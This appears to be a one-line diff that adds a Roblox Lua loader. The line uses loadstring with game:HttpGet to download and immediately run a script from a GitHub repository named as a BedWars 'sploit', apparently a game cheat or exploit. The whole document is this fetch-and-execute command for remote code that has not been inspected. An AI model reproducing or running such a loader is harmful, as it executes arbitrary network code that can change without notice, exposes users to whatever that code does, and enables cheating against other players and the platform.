@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pkplaysrblx/tweak3d-sploit-bedwars-roblox/main/script/bedwars"))()
